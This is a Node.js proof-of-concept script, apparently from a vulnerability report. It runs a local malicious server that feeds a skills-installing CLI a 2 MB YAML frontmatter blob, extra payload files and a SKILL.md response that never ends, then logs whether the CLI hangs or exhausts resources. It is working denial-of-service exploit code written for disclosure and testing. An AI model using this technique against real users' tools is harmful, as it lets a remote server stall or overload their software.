#!/usr/bin/env node
import http from 'node:http';
import { spawn } from 'node:child_process';
import { existsSync, mkdirSync, writeFileSync, appendFileSync, chmodSync } from 'node:fs';
import { dirname, join, resolve } from 'node:path';
import { fileURLToPath } from 'node:url';
import { tmpdir } from 'node:os';

const findingDir = dirname(fileURLToPath(import.meta.url));
const repoRoot = resolve(findingDir, '../../..');
const evidenceDir = join(findingDir, 'evidence');
const exploitLog = join(evidenceDir, 'exploit.log');
const impactLog = join(evidenceDir, 'impact.log');

mkdirSync(evidenceDir, { recursive: true });
writeFileSync(exploitLog, '');

function log(line) {
  console.log(line);
  appendFileSync(exploitLog, `${line}\n`);
}

function writeEvidenceFiles() {
  const setupSh = `#!/usr/bin/env bash
set -euo pipefail
cd "$(dirname "$0")/../../../.."
node -v
pnpm -v || true
# If dist/bin artifacts are absent, build them before running the PoC:
# pnpm install --frozen-lockfile
# pnpm run build
`;
  const exploitSh = `#!/usr/bin/env bash
set -euo pipefail
FINDING_DIR="$(cd "$(dirname "$0")/.." && pwd)"
node "$FINDING_DIR/poc.js"
`;
  writeFileSync(join(evidenceDir, 'setup.sh'), setupSh);
  writeFileSync(join(evidenceDir, 'exploit.sh'), exploitSh);
  try {
    chmodSync(join(evidenceDir, 'setup.sh'), 0o755);
    chmodSync(join(evidenceDir, 'exploit.sh'), 0o755);
  } catch {}
  writeFileSync(join(evidenceDir, 'setup.log'), `repository: ${repoRoot}\nsetup: used existing checkout; no external service required\n`);
}

function runProcess(command, args, { timeoutMs = 10000 } = {}) {
  return new Promise((resolveResult) => {
    const child = spawn(command, args, {
      cwd: repoRoot,
      stdio: ['ignore', 'pipe', 'pipe'],
      env: {
        ...process.env,
        CI: '1',
        NO_COLOR: '1',
        DISABLE_TELEMETRY: '1',
        HOME: join(tmpdir(), `skills-poc-home-${process.pid}`),
      },
    });

    let stdout = '';
    let stderr = '';
    let timedOut = false;
    const timer = setTimeout(() => {
      timedOut = true;
      child.kill('SIGKILL');
    }, timeoutMs);

    child.stdout.on('data', (d) => {
      stdout += d.toString();
    });
    child.stderr.on('data', (d) => {
      stderr += d.toString();
    });
    child.on('error', (error) => {
      clearTimeout(timer);
      resolveResult({ code: null, signal: null, timedOut, stdout, stderr: `${stderr}${error.message}` });
    });
    child.on('close', (code, signal) => {
      clearTimeout(timer);
      resolveResult({ code, signal, timedOut, stdout, stderr });
    });
  });
}

function makeServer() {
  const yamlBytes = Number(process.env.POC_YAML_BYTES || 2 * 1024 * 1024);
  const auxCount = Number(process.env.POC_AUX_COUNT || 8);
  const auxBytes = Number(process.env.POC_AUX_BYTES || 256 * 1024);
  const auxFiles = Array.from({ length: auxCount }, (_, i) => `payload-${i}.txt`);
  const stats = {
    bytesServed: 0,
    requests: [],
    auxServed: 0,
    largeSkillRequested: false,
    stallSkillRequested: false,
  };

  const skillMd = `---\nname: dos-skill\ndescription: parses attacker supplied YAML frontmatter\nmetadata:\n  attacker_blob: "${'A'.repeat(yamlBytes)}"\n---\n# dos-skill\n`;
  const auxPayload = Buffer.alloc(auxBytes, 0x50);

  function send(res, status, body, type = 'text/plain') {
    const length = Buffer.isBuffer(body) ? body.length : Buffer.byteLength(body);
    stats.bytesServed += length;
    res.writeHead(status, { 'content-type': type, 'content-length': String(length) });
    res.end(body);
  }

  const server = http.createServer((req, res) => {
    const path = new URL(req.url || '/', 'http://attacker.test').pathname;
    stats.requests.push(path);

    if (path === '/large/.well-known/agent-skills/index.json') {
      return send(
        res,
        200,
        JSON.stringify({
          skills: [
            {
              name: 'dos-skill',
              description: 'remote resource exhaustion',
              files: ['SKILL.md', ...auxFiles],
            },
          ],
        }),
        'application/json'
      );
    }

    if (path === '/large/.well-known/agent-skills/dos-skill/SKILL.md') {
      stats.largeSkillRequested = true;
      return send(res, 200, skillMd, 'text/markdown');
    }

    const auxMatch = path.match(/^\/large\/\.well-known\/agent-skills\/dos-skill\/(payload-\d+\.txt)$/);
    if (auxMatch) {
      stats.auxServed += 1;
      return send(res, 200, auxPayload, 'text/plain');
    }

    if (path === '/stall/.well-known/agent-skills/index.json') {
      return send(
        res,
        200,
        JSON.stringify({
          skills: [
            { name: 'hang-skill', description: 'never finishes SKILL.md', files: ['SKILL.md'] },
          ],
        }),
        'application/json'
      );
    }

    if (path === '/stall/.well-known/agent-skills/hang-skill/SKILL.md') {
      stats.stallSkillRequested = true;
      res.writeHead(200, { 'content-type': 'text/markdown' });
      const prefix = '---\nname: hang-skill\ndescription: response body never terminates\n---\n#';
      stats.bytesServed += Buffer.byteLength(prefix);
      res.write(prefix);
      const interval = setInterval(() => {
        stats.bytesServed += 1;
        res.write('x');
      }, 250);
      req.on('close', () => clearInterval(interval));
      return;
    }

    send(res, 404, 'not found');
  });

  const sockets = new Set();
  server.on('connection', (socket) => {
    sockets.add(socket);
    socket.on('close', () => sockets.delete(socket));
  });

  return { server, sockets, stats, yamlBytes, auxCount, auxBytes };
}

async function main() {
  writeEvidenceFiles();

  const cliPath = join(repoRoot, 'bin', 'cli.mjs');
  if (!existsSync(cliPath)) {
    writeFileSync(join(evidenceDir, 'healthcheck.log'), `missing CLI path: ${cliPath}\n`);
    const result = { status: 'inconclusive', evidence: 'bin/cli.mjs missing', notes: 'run pnpm run build before executing the PoC' };
    console.log(JSON.stringify(result));
    appendFileSync(exploitLog, `${JSON.stringify(result)}\n`);
    return;
  }

  const health = await runProcess(process.execPath, [cliPath, '--version'], { timeoutMs: 5000 });
  writeFileSync(
    join(evidenceDir, 'healthcheck.log'),
    `command: ${process.execPath} ${cliPath} --version\nexit: ${health.code} signal: ${health.signal} timedOut: ${health.timedOut}\nstdout:\n${health.stdout}\nstderr:\n${health.stderr}\n`
  );

  const { server, sockets, stats, yamlBytes, auxCount, auxBytes } = makeServer();
  await new Promise((resolveListen) => server.listen(0, '127.0.0.1', resolveListen));
  const { port } = server.address();
  const baseUrl = `http://127.0.0.1:${port}`;

  writeFileSync(
    join(evidenceDir, 'env-info.txt'),
    `repo: ${repoRoot}\nnode: ${process.version}\ncli: ${cliPath}\nattacker_base_url: ${baseUrl}\nyaml_frontmatter_bytes: ${yamlBytes}\naux_files: ${auxCount}\naux_file_bytes: ${auxBytes}\n`
  );

  try {
    log(`[+] malicious well-known server listening at ${baseUrl}`);

    const largeUrl = `${baseUrl}/large`;
    log(`[+] running real CLI list against finite oversized frontmatter/files: ${largeUrl}`);
    const large = await runProcess(process.execPath, [cliPath, 'add', largeUrl, '--list', '-y'], {
      timeoutMs: 20000,
    });
    appendFileSync(
      exploitLog,
      `\n--- large CLI stdout ---\n${large.stdout}\n--- large CLI stderr ---\n${large.stderr}\n`
    );
    const largeConfirmed =
      large.code === 0 && stats.largeSkillRequested && stats.auxServed === auxCount;
    log(
      `[+] large-body run: exit=${large.code}, requested_SKILL.md=${stats.largeSkillRequested}, aux_fetched=${stats.auxServed}/${auxCount}, bytes_served=${stats.bytesServed}`
    );

    const stallUrl = `${baseUrl}/stall`;
    log(`[+] running real CLI against never-ending SKILL.md response: ${stallUrl}`);
    const stallStart = Date.now();
    const stall = await runProcess(process.execPath, [cliPath, 'add', stallUrl, '--list', '-y'], {
      timeoutMs: 3000,
    });
    const stallElapsed = Date.now() - stallStart;
    appendFileSync(
      exploitLog,
      `\n--- stall CLI stdout ---\n${stall.stdout}\n--- stall CLI stderr ---\n${stall.stderr}\n`
    );
    const stallConfirmed = stall.timedOut && stats.stallSkillRequested;
    log(
      `[+] stall run: timedOut=${stall.timedOut}, signal=${stall.signal}, requested_SKILL.md=${stats.stallSkillRequested}, elapsed_ms=${stallElapsed}`
    );

    const impact = [
      `large_run_confirmed=${largeConfirmed}`,
      `stall_run_confirmed=${stallConfirmed}`,
      `attacker_controlled_bytes_served=${stats.bytesServed}`,
      `attacker_controlled_yaml_frontmatter_bytes=${yamlBytes}`,
      `attacker_controlled_aux_files_fetched=${stats.auxServed}`,
      `stall_observation=CLI remained alive until external ${stallElapsed}ms timeout while response.text() waited for the attacker-controlled SKILL.md body to end`,
      `requests=${stats.requests.join(',')}`,
    ].join('\n');
    writeFileSync(impactLog, `${impact}\n`);

    const status = largeConfirmed || stallConfirmed ? 'confirmed' : 'failed';
    const evidence = stallConfirmed
      ? `CLI hung on never-ending well-known SKILL.md body for ${stallElapsed}ms`
      : largeConfirmed
        ? `CLI fetched and parsed ${stats.bytesServed} attacker-controlled bytes before --list output`
        : 'CLI did not fetch the crafted resource as expected';
    const notes = `large=${largeConfirmed}; stall=${stallConfirmed}; bytes=${stats.bytesServed}; aux=${stats.auxServed}/${auxCount}`;
    const result = { status, evidence, notes };
    console.log(JSON.stringify(result));
    appendFileSync(exploitLog, `${JSON.stringify(result)}\n`);
  } finally {
    server.close();
    for (const socket of sockets) socket.destroy();
  }
}

main().catch((error) => {
  const result = { status: 'inconclusive', evidence: 'PoC execution error', notes: error instanceof Error ? error.message : String(error) };
  writeFileSync(impactLog, `${result.notes}\n`);
  console.log(JSON.stringify(result));
  appendFileSync(exploitLog, `${JSON.stringify(result)}\n`);
});
